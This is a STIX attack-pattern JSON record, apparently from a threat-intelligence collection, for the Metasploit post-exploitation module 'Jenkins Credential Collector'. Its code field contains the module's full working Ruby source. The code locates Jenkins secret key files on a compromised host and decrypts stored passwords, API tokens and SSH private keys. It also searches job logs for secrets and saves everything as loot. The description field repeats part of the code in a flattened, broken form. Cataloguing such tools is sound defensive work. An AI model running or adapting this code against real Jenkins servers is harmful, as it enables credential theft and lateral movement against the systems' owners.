{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce4f94c1-41e0-47ca-b174-291d9cf0ed22",
    "created": "2024-08-14T16:33:19.183515Z",
    "modified": "2024-08-14T16:33:19.183519Z",
    "name": "Jenkins Credential Collector",
    "description": " This module can be used to extract saved Jenkins credentials, user tokens, SSH keys, and secrets. Interesting files will be stored in loot along with combined csv output.  'License' => MSF_LICENSE ] ) @creds.uniq.each { |e| creds_table << e  print_good(\"\\n\" + creds_table.to_s) if !creds_table.rows.count.zero? store_loot('all.creds.csv', 'text/plain', session, creds_table.to_csv, nil, nil) if datastore['STORE_LOOT']  api_table = Rex::Text::Table.new( 'Header' => 'API Keys' 'Indent' => 1 'Columns' => [ 'Username' 'API Tokens' ] ) @api_tokens.uniq.each { |e| api_table << e  print_good(\"\\n\" + api_table.to_s) if !api_table.rows.count.zero? store_loot('all.apitokens.csv', 'text/plain', session, api_table.to_csv, nil, nil) if datastore['STORE_LOOT']  node_table = Rex::Text::Table.new( 'Header' => 'Nodes' 'Indent' => 1 'Columns' => [ 'Node Name' 'Hostname' 'Port' 'Cred Id' ] ) @nodes.uniq.each { |e| node_table << e  print_good(\"\\n\" + node_table.to_s) if !node_table.rows.count.zero? store_loot('all.nodes.csv', 'text/plain', session, node_table.to_csv, nil, nil) if datastore['STORE_LOOT']  @ssh_keys.uniq.each do |e| print_good('SSH Key') print_status(\" ID: #{e[0]}\") print_status(\" Description: #{e[1]}\") if !e[1].blank? print_status(\" Passphrase:  #{e[2]}\") if !e[2].blank? print_status(\" Username:    #{e[3]}\") if !e[3].blank? print_status(\"\\n#{e[4]}\") end ssh_output = @ssh_keys.each { |e| e.join(',') + \"\\n\\n\\n\"  store_loot('all.sshkeys', 'text/plain', session, ssh_output, nil, nil) if datastore['STORE_LOOT'] && !ssh_output.empty? end  def grep_job_history(path, platform) print_status('Searching through job history for interesting keywords...') case platform when 'windows' results = cmd_exec('cmd.exe', \"/c findstr /s /i \\\"secret key token password\\\" \\\"#{path}*log\\\"\") when 'nix' results = cmd_exec('/bin/egrep', \"-ir \\\"password|secret|key\\\" --include log \\\"#{path}\\\"\") end store_loot('jobhistory.truffles', 'text/plain', session, results, nil, nil) if datastore['STORE_LOOT'] && !results.empty? print_good(\"Job Log truffles:\\n#{results}\") if !results.empty? end  def find_configs(path, platform) case platform  when 'windows' case session.type when 'meterpreter' configs = '' c = session.fs.file.search(path, 'config.xml', true, -1) \\ .concat(session.fs.file.search(path, 'build.xml', true, -1)) c.each { |f| configs << f['path'] + '\\\\' + f['name'] + \"\\n\"  else configs = cmd_exec('cmd.exe', \"/c dir /b /s \\\"#{path}\\\\*config.xml\\\" \\\"#{path}\\\\*build.xml\\\"\") end configs.split(\"\\n\").each do |f| case f when /\\\\users\\\\/ parse_users(f) when /\\\\jobs\\\\/ parse_jobs(f) when /\\\\nodes\\\\/ parse_nodes(f) end end  when 'nix' configs = cmd_exec('/usr/bin/find', \"\\\"#{path}\\\" -name config.xml -o -name build.xml\") configs.split(\"\\n\").each do |f| case f when %r{/users/ parse_users(f) when %r{/jobs/ parse_jobs(f) when %r{/nodes/ parse_nodes(f) end end end end  def get_key_material(home, platform) case platform when 'windows' master_key_path = \"#{home}\\\\secrets\\\\master.key\" hudson_secret_key_path = \"#{home}\\\\secrets\\\\hudson.util.Secret\" initial_admin_password_path = \"#{home}\\\\secrets\\\\initialAdminPassword\" when 'nix' master_key_path = \"#{home}/secrets/master.key\" hudson_secret_key_path = \"#{home}/secrets/hudson.util.Secret\" initial_admin_password_path = \"#{home}/secrets/initialAdminPassword\" end  # Newer versions of Jenkins have an `initialAdminPassword` which contains the initial password set when configuring Jenkins # tested on versions 2.401.1, 2.346.3, 2.103 if exists?(initial_admin_password_path) initial_admin_password = read_file(initial_admin_password_path).strip  if datastore['STORE_LOOT'] loot_path = store_loot('initialAdminPassword', 'text/plain', session, initial_admin_password) print_status(\"File initialAdminPassword saved to #{loot_path}\") else print_status(\"File initialAdminPassword contents: #{initial_admin_password}\") end else print_error 'Cannot read initialAdminPassword...' end  if exists?(master_key_path) @master_key = read_file(master_key_path)  if datastore['STORE_LOOT'] loot_path = store_loot('master.key', 'text/plain', session, @master_key) print_status(\"File master.key saved to #{loot_path}\") else print_status(\"File master.key contents: #{@master_key}\") end else print_error 'Cannot read master.key...' end  # Newer versions of Jenkins do not create `hudson.util.Secret` until credentials have been added via Jenkins client # tested on versions 2.401.1, 2.346.3 if exists?(hudson_secret_key_path) @hudson_secret_key = read_file(hudson_secret_key_path)  if datastore['STORE_LOOT'] loot_path = store_loot('hudson.util.secret', 'application/octet-stream', session, @hudson_secret_key) print_status(\"File hudson.util.Secret saved to #{loot_path}\") end else print_error 'Cannot read hudson.util.Secret...' end end  def find_home(platform) if datastore['JENKINS_HOME'] if exist?(datastore['JENKINS_HOME'] + '/secret.key.not-so-secret') return datastore['JENKINS_HOME'] end print_status(datastore['JENKINS_HOME'] + ' does not seem to contain secrets.') end  print_status('Searching for Jenkins directory... This could take some time...') case platform when 'windows' if exists?('C:\\\\ProgramData\\\\Jenkins\\\\.jenkins\\\\secret.key.not-so-secret') home = 'C:\\\\ProgramData\\\\Jenkins\\\\.jenkins\\\\' else case session.type when 'meterpreter' home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path'] else home = cmd_exec('cmd.exe', \"/c dir /b /s c:\\*secret.key.not-so-secret\", 120).split('\\\\')[0..-2].join('\\\\').strip end end when 'nix' if exists?('/var/lib/jenkins/secret.key.not-so-secret') home = '/var/lib/jenkins/' else home = cmd_exec('find', \"/ -name 'secret.key.not-so-secret' 2>/dev/null\", 120).split('/')[0..-2].join('/').strip end end fail_with(Failure::NotFound, 'No Jenkins installation found or readable, exiting...') if !exist?(home) print_status(\"Found Jenkins installation at #{home}\") home end  def gathernix home = find_home('nix') get_key_material(home, 'nix') parse_credentialsxml(home + '/credentials.xml') find_configs(home, 'nix') grep_job_history(home + '/jobs/', 'nix') if datastore['SEARCH_JOBS'] pretty_print_gathered end  def gatherwin home = find_home('windows') get_key_material(home, 'windows') parse_credentialsxml(home + '\\\\credentials.xml') find_configs(home, 'windows') grep_job_history(home + '\\\\jobs\\\\', 'windows') if datastore['SEARCH_JOBS'] pretty_print_gathered end  def run case session.platform when 'linux' gathernix else gatherwin end end  def decrypt_key(master_key, hudson_secret_key) # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c magic = '::::MAGIC::::' hashed_master_key = Digest::SHA256.digest(master_key)[0..15] intermediate = OpenSSL::Cipher.new('AES-128-ECB') intermediate.decrypt intermediate.key = hashed_master_key  salted_final = intermediate.update(hudson_secret_key) + intermediate.final raise 'no magic key in a' if !salted_final.include?(magic)  salted_final[0..15] end  def decrypt_v2(encrypted) master_key = @master_key hudson_secret_key = @hudson_secret_key key = decrypt_key(master_key, hudson_secret_key) encrypted_text = Base64.decode64(encrypted).bytes  iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff) data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff) if encrypted_text.length != (1 + 8 + iv_length + data_length) print_error(\"Invalid encrypted string: #{encrypted}\") end iv = encrypted_text[9..(9 + iv_length)].pack('C*')[0..15] code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*').force_encoding('UTF-8')  cipher = OpenSSL::Cipher.new('AES-128-CBC') cipher.decrypt cipher.key = key cipher.iv = iv  text = cipher.update(code) + cipher.final text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token text rescue StandardError => e print_error(e.to_s) return 'Could not decrypt string' end  def decrypt_legacy(encrypted) # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c  magic = '::::MAGIC::::' master_key = @master_key hudson_secret_key = @hudson_secret_key encrypted = Base64.decode64(encrypted)  key = decrypt_key(master_key, hudson_secret_key) cipher = OpenSSL::Cipher.new('AES-128-ECB') cipher.decrypt cipher.key = key  text = cipher.update(encrypted) + cipher.final text = text[0..(text.length - magic.size - 1)] text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token text rescue StandardError => e print_error(e.to_s) return 'Could not decrypt string' end  def decrypt(encrypted) return if encrypted.empty?  if encrypted[0] == '{' && encrypted[-1] == '}' decrypt_v2(encrypted) else decrypt_legacy(encrypted) end end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/jenkins_gather.rb",
            "external_id": "jenkins_gather.rb"
        }
    ],
    "x_code_snippet": "require 'nokogiri'\nrequire 'base64'\nrequire 'digest'\nrequire 'openssl'\nrequire 'sshkey'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Post::Linux::System\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Jenkins Credential Collector',\n        'Description' => %q{\n          This module can be used to extract saved Jenkins credentials, user\n          tokens, SSH keys, and secrets. Interesting files will be stored in\n          loot along with combined csv output.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'thesubtlety' ],\n        'Platform' => [ 'linux', 'win' ],\n        'SessionTypes' => %w[shell meterpreter],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_search\n            ]\n          }\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('JENKINS_HOME', [ false, 'Set to the home directory of Jenkins. The Linux versions default to /var/lib/jenkins, but C:\\\\\\\\ProgramData\\\\\\\\Jenkins\\\\\\\\.jenkins on Windows.', ]),\n        OptBool.new('STORE_LOOT', [false, 'Store files in loot (will simply output file to console if set to false).', true]),\n        OptBool.new('SEARCH_JOBS', [false, 'Search through job history logs for interesting keywords. Increases runtime.', false])\n      ]\n    )\n\n    @nodes = []\n    @creds = []\n    @ssh_keys = []\n    @api_tokens = []\n  end\n\n  def report_creds(user, pass)\n    return if user.blank? || pass.blank?\n\n    credential_data = {\n      origin_type: :session,\n      post_reference_name: fullname,\n      private_data: pass,\n      private_type: :password,\n      session_id: session_db_id,\n      username: user,\n      workspace_id: myworkspace_id\n    }\n\n    create_credential(credential_data)\n  end\n\n  def parse_credentialsxml(file)\n    # Newer versions of Jenkins do not create `credentials.xml` until credentials have been added via Jenkins client\n    # tested on versions 2.401.1, 2.346.3\n    if exists?(file)\n      vprint_status('Parsing credentials.xml...')\n      f = read_file(file)\n      if datastore['STORE_LOOT']\n        loot_path = store_loot('jenkins.creds', 'text/xml', session, f, file)\n        vprint_status(\"File credentials.xml saved to #{loot_path}\")\n      end\n    else\n      vprint_status('There is no credential.xml file present')\n    end\n\n    xml_doc = Nokogiri::XML(f)\n    xml_doc.xpath('//com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl').each do |node|\n      username = node.xpath('username').text\n      password = decrypt(node.xpath('password').text)\n      description = node.xpath('description').text\n      print_good(\"Credentials found - Username: #{username} Password: #{password}\")\n      report_creds(username, password)\n      @creds << [username, password, description]\n    end\n\n    xml_doc.xpath('//com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey').each do |node|\n      cred_id = node.xpath('id').text\n      username = node.xpath('username').text\n      description = node.xpath('description').text\n      passphrase = node.xpath('passphrase').text\n      passphrase = decrypt(passphrase)\n      private_key = node.xpath('//privateKeySource//privateKey').text\n      private_key = decrypt(private_key) if !private_key.match?(/----BEGIN/)\n      print_good(\"SSH Key found! ID: #{cred_id} Passphrase: #{passphrase || '<empty>'} Username: #{username} Description: #{description}\")\n\n      store_loot(\"ssh-#{cred_id}\", 'text/plain', session, private_key, nil, nil) if datastore['STORE_LOOT']\n      @ssh_keys << [cred_id, description, passphrase, username, private_key]\n\n      begin\n        k = OpenSSL::PKey::RSA.new(private_key, passphrase)\n        key = SSHKey.new(k, passphrase: passphrase, comment: cred_id)\n        credential_data = {\n          origin_type: :session,\n          session_id: session_db_id,\n          post_reference_name: refname,\n          private_type: :ssh_key,\n          private_data: key.key_object.to_s,\n          username: cred_id,\n          workspace_id: myworkspace_id\n        }\n        create_credential(credential_data)\n      rescue OpenSSL::OpenSSLError => e\n        print_error(\"Could not save SSH key to creds: #{e.message}\")\n      end\n    end\n  end\n\n  def parse_users(file)\n    f = read_file(file)\n    fname = file.tr('\\\\', '/').split('/')[-2]\n    vprint_status(\"Parsing user #{fname}...\")\n\n    username = ''\n    api_token = ''\n    xml_doc = Nokogiri::XML(f)\n    xml_doc.xpath('//user').each do |node|\n      username = node.xpath('fullName').text\n    end\n\n    xml_doc.xpath('//jenkins.security.ApiTokenProperty').each do |node|\n      api_token = decrypt(node.xpath('apiToken').text)\n    end\n\n    if api_token\n      print_good(\"API Token found - Username: #{username} Token: #{api_token}\")\n      @api_tokens << [username, api_token]\n      report_creds(username, api_token)\n      store_loot(\"user-#{fname}\", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']\n    end\n  end\n\n  def parse_nodes(file)\n    f = read_file(file)\n    fname = file.tr('\\\\', '/').split('/')[-2]\n    vprint_status(\"Parsing node #{fname}...\")\n\n    node_name = ''\n    description = ''\n    host = ''\n    port = ''\n    cred_id = ''\n    xml_doc = Nokogiri::XML(f)\n    xml_doc.xpath('//slave').each do |node|\n      node_name = node.xpath('name').text\n      description = node.xpath('description').text\n    end\n\n    xml_doc.xpath('//launcher').each do |node|\n      host = node.xpath('host').text\n      port = node.xpath('port').text\n      cred_id = node.xpath('credentialsId').text\n    end\n\n    @nodes << [node_name, host, port, description, cred_id]\n    print_good(\"Node Info found - Name: #{node_name} Host: #{host} Port: #{port} CredID: #{cred_id}\")\n    store_loot(\"node-#{fname}\", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']\n  end\n\n  def parse_jobs(file)\n    f = read_file(file)\n    fname = file.tr('\\\\', '/').split('/')[-4]\n    vprint_status(\"Parsing job #{fname}...\")\n\n    username = ''\n    pw = ''\n    job_name = file.split(%r{/jobs/(.*?)/builds/})[1]\n    xml_doc = Nokogiri::XML(f)\n    xml_doc.xpath('//hudson.model.PasswordParameterValue').each do |node|\n      username = node.xpath('name').text\n      pw = decrypt(node.xpath('value').text)\n    end\n\n    @creds << [username, pw, '']\n    print_good(\"Job Info found - Job Name: #{job_name} User: #{username} Password: #{pw}\") if !pw.blank?\n    store_loot(\"job-#{fname}\", 'text/plain', session, f, nil, nil) if datastore['STORE_LOOT']\n  end\n\n  def pretty_print_gathered\n    creds_table = Rex::Text::Table.new(\n      'Header' => 'Creds',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Username',\n          'Password',\n          'Description'\n        ]\n    )\n    @creds.uniq.each { |e| creds_table << e }\n    print_good(\"\\n\" + creds_table.to_s) if !creds_table.rows.count.zero?\n    store_loot('all.creds.csv', 'text/plain', session, creds_table.to_csv, nil, nil) if datastore['STORE_LOOT']\n\n    api_table = Rex::Text::Table.new(\n      'Header' => 'API Keys',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Username',\n          'API Tokens'\n        ]\n    )\n    @api_tokens.uniq.each { |e| api_table << e }\n    print_good(\"\\n\" + api_table.to_s) if !api_table.rows.count.zero?\n    store_loot('all.apitokens.csv', 'text/plain', session, api_table.to_csv, nil, nil) if datastore['STORE_LOOT']\n\n    node_table = Rex::Text::Table.new(\n      'Header' => 'Nodes',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Node Name',\n          'Hostname',\n          'Port',\n          'Description',\n          'Cred Id'\n        ]\n    )\n    @nodes.uniq.each { |e| node_table << e }\n    print_good(\"\\n\" + node_table.to_s) if !node_table.rows.count.zero?\n    store_loot('all.nodes.csv', 'text/plain', session, node_table.to_csv, nil, nil) if datastore['STORE_LOOT']\n\n    @ssh_keys.uniq.each do |e|\n      print_good('SSH Key')\n      print_status(\" ID: #{e[0]}\")\n      print_status(\" Description: #{e[1]}\") if !e[1].blank?\n      print_status(\" Passphrase:  #{e[2]}\") if !e[2].blank?\n      print_status(\" Username:    #{e[3]}\") if !e[3].blank?\n      print_status(\"\\n#{e[4]}\")\n    end\n    ssh_output = @ssh_keys.each { |e| e.join(',') + \"\\n\\n\\n\" }\n    store_loot('all.sshkeys', 'text/plain', session, ssh_output, nil, nil) if datastore['STORE_LOOT'] && !ssh_output.empty?\n  end\n\n  def grep_job_history(path, platform)\n    print_status('Searching through job history for interesting keywords...')\n    case platform\n    when 'windows'\n      results = cmd_exec('cmd.exe', \"/c findstr /s /i \\\"secret key token password\\\" \\\"#{path}*log\\\"\")\n    when 'nix'\n      results = cmd_exec('/bin/egrep', \"-ir \\\"password|secret|key\\\" --include log \\\"#{path}\\\"\")\n    end\n    store_loot('jobhistory.truffles', 'text/plain', session, results, nil, nil) if datastore['STORE_LOOT'] && !results.empty?\n    print_good(\"Job Log truffles:\\n#{results}\") if !results.empty?\n  end\n\n  def find_configs(path, platform)\n    case platform\n\n    when 'windows'\n      case session.type\n      when 'meterpreter'\n        configs = ''\n        c = session.fs.file.search(path, 'config.xml', true, -1) \\\n                   .concat(session.fs.file.search(path, 'build.xml', true, -1))\n        c.each { |f| configs << f['path'] + '\\\\' + f['name'] + \"\\n\" }\n      else\n        configs = cmd_exec('cmd.exe', \"/c dir /b /s \\\"#{path}\\\\*config.xml\\\" \\\"#{path}\\\\*build.xml\\\"\")\n      end\n      configs.split(\"\\n\").each do |f|\n        case f\n        when /\\\\users\\\\/\n          parse_users(f)\n        when /\\\\jobs\\\\/\n          parse_jobs(f)\n        when /\\\\nodes\\\\/\n          parse_nodes(f)\n        end\n      end\n\n    when 'nix'\n      configs = cmd_exec('/usr/bin/find', \"\\\"#{path}\\\" -name config.xml -o -name build.xml\")\n      configs.split(\"\\n\").each do |f|\n        case f\n        when %r{/users/}\n          parse_users(f)\n        when %r{/jobs/}\n          parse_jobs(f)\n        when %r{/nodes/}\n          parse_nodes(f)\n        end\n      end\n    end\n  end\n\n  def get_key_material(home, platform)\n    case platform\n    when 'windows'\n      master_key_path = \"#{home}\\\\secrets\\\\master.key\"\n      hudson_secret_key_path = \"#{home}\\\\secrets\\\\hudson.util.Secret\"\n      initial_admin_password_path = \"#{home}\\\\secrets\\\\initialAdminPassword\"\n    when 'nix'\n      master_key_path = \"#{home}/secrets/master.key\"\n      hudson_secret_key_path = \"#{home}/secrets/hudson.util.Secret\"\n      initial_admin_password_path = \"#{home}/secrets/initialAdminPassword\"\n    end\n\n    # Newer versions of Jenkins have an `initialAdminPassword` which contains the initial password set when configuring Jenkins\n    # tested on versions 2.401.1, 2.346.3, 2.103\n    if exists?(initial_admin_password_path)\n      initial_admin_password = read_file(initial_admin_password_path).strip\n\n      if datastore['STORE_LOOT']\n        loot_path = store_loot('initialAdminPassword', 'text/plain', session, initial_admin_password)\n        print_status(\"File initialAdminPassword saved to #{loot_path}\")\n      else\n        print_status(\"File initialAdminPassword contents: #{initial_admin_password}\")\n      end\n    else\n      print_error 'Cannot read initialAdminPassword...'\n    end\n\n    if exists?(master_key_path)\n      @master_key = read_file(master_key_path)\n\n      if datastore['STORE_LOOT']\n        loot_path = store_loot('master.key', 'text/plain', session, @master_key)\n        print_status(\"File master.key saved to #{loot_path}\")\n      else\n        print_status(\"File master.key contents: #{@master_key}\")\n      end\n    else\n      print_error 'Cannot read master.key...'\n    end\n\n    # Newer versions of Jenkins do not create `hudson.util.Secret` until credentials have been added via Jenkins client\n    # tested on versions 2.401.1, 2.346.3\n    if exists?(hudson_secret_key_path)\n      @hudson_secret_key = read_file(hudson_secret_key_path)\n\n      if datastore['STORE_LOOT']\n        loot_path = store_loot('hudson.util.secret', 'application/octet-stream', session, @hudson_secret_key)\n        print_status(\"File hudson.util.Secret saved to #{loot_path}\")\n      end\n    else\n      print_error 'Cannot read hudson.util.Secret...'\n    end\n  end\n\n  def find_home(platform)\n    if datastore['JENKINS_HOME']\n      if exist?(datastore['JENKINS_HOME'] + '/secret.key.not-so-secret')\n        return datastore['JENKINS_HOME']\n      end\n      print_status(datastore['JENKINS_HOME'] + ' does not seem to contain secrets.')\n    end\n\n    print_status('Searching for Jenkins directory... This could take some time...')\n    case platform\n    when 'windows'\n      if exists?('C:\\\\ProgramData\\\\Jenkins\\\\.jenkins\\\\secret.key.not-so-secret')\n        home = 'C:\\\\ProgramData\\\\Jenkins\\\\.jenkins\\\\'\n      else\n        case session.type\n        when 'meterpreter'\n          home = session.fs.file.search(nil, 'secret.key.not-so-secret')[0]['path']\n        else\n          home = cmd_exec('cmd.exe', \"/c dir /b /s c:\\*secret.key.not-so-secret\", 120).split('\\\\')[0..-2].join('\\\\').strip\n        end\n      end\n    when 'nix'\n      if exists?('/var/lib/jenkins/secret.key.not-so-secret')\n        home = '/var/lib/jenkins/'\n      else\n        home = cmd_exec('find', \"/ -name 'secret.key.not-so-secret' 2>/dev/null\", 120).split('/')[0..-2].join('/').strip\n      end\n    end\n    fail_with(Failure::NotFound, 'No Jenkins installation found or readable, exiting...') if !exist?(home)\n    print_status(\"Found Jenkins installation at #{home}\")\n    home\n  end\n\n  def gathernix\n    home = find_home('nix')\n    get_key_material(home, 'nix')\n    parse_credentialsxml(home + '/credentials.xml')\n    find_configs(home, 'nix')\n    grep_job_history(home + '/jobs/', 'nix') if datastore['SEARCH_JOBS']\n    pretty_print_gathered\n  end\n\n  def gatherwin\n    home = find_home('windows')\n    get_key_material(home, 'windows')\n    parse_credentialsxml(home + '\\\\credentials.xml')\n    find_configs(home, 'windows')\n    grep_job_history(home + '\\\\jobs\\\\', 'windows') if datastore['SEARCH_JOBS']\n    pretty_print_gathered\n  end\n\n  def run\n    case session.platform\n    when 'linux'\n      gathernix\n    else\n      gatherwin\n    end\n  end\n\n  def decrypt_key(master_key, hudson_secret_key)\n    # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c\n    magic = '::::MAGIC::::'\n    hashed_master_key = Digest::SHA256.digest(master_key)[0..15]\n    intermediate = OpenSSL::Cipher.new('AES-128-ECB')\n    intermediate.decrypt\n    intermediate.key = hashed_master_key\n\n    salted_final = intermediate.update(hudson_secret_key) + intermediate.final\n    raise 'no magic key in a' if !salted_final.include?(magic)\n\n    salted_final[0..15]\n  end\n\n  def decrypt_v2(encrypted)\n    master_key = @master_key\n    hudson_secret_key = @hudson_secret_key\n    key = decrypt_key(master_key, hudson_secret_key)\n    encrypted_text = Base64.decode64(encrypted).bytes\n\n    iv_length = ((encrypted_text[1] & 0xff) << 24) | ((encrypted_text[2] & 0xff) << 16) | ((encrypted_text[3] & 0xff) << 8) | (encrypted_text[4] & 0xff)\n    data_length = ((encrypted_text[5] & 0xff) << 24) | ((encrypted_text[6] & 0xff) << 16) | ((encrypted_text[7] & 0xff) << 8) | (encrypted_text[8] & 0xff)\n    if encrypted_text.length != (1 + 8 + iv_length + data_length)\n      print_error(\"Invalid encrypted string: #{encrypted}\")\n    end\n    iv = encrypted_text[9..(9 + iv_length)].pack('C*')[0..15]\n    code = encrypted_text[(9 + iv_length)..encrypted_text.length].pack('C*').force_encoding('UTF-8')\n\n    cipher = OpenSSL::Cipher.new('AES-128-CBC')\n    cipher.decrypt\n    cipher.key = key\n    cipher.iv = iv\n\n    text = cipher.update(code) + cipher.final\n    text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token\n    text\n  rescue StandardError => e\n    print_error(e.to_s)\n    return 'Could not decrypt string'\n  end\n\n  def decrypt_legacy(encrypted)\n    # https://gist.github.com/juyeong/081379bd1ddb3754ed51ab8b8e535f7c\n\n    magic = '::::MAGIC::::'\n    master_key = @master_key\n    hudson_secret_key = @hudson_secret_key\n    encrypted = Base64.decode64(encrypted)\n\n    key = decrypt_key(master_key, hudson_secret_key)\n    cipher = OpenSSL::Cipher.new('AES-128-ECB')\n    cipher.decrypt\n    cipher.key = key\n\n    text = cipher.update(encrypted) + cipher.final\n    text = text[0..(text.length - magic.size - 1)]\n    text = Digest::MD5.new.update(text).hexdigest if text.length == 32 # Assuming token\n    text\n  rescue StandardError => e\n    print_error(e.to_s)\n    return 'Could not decrypt string'\n  end\n\n  def decrypt(encrypted)\n    return if encrypted.empty?\n\n    if encrypted[0] == '{' && encrypted[-1] == '}'\n      decrypt_v2(encrypted)\n    else\n      decrypt_legacy(encrypted)\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'linux', 'win' ]"
    ]
}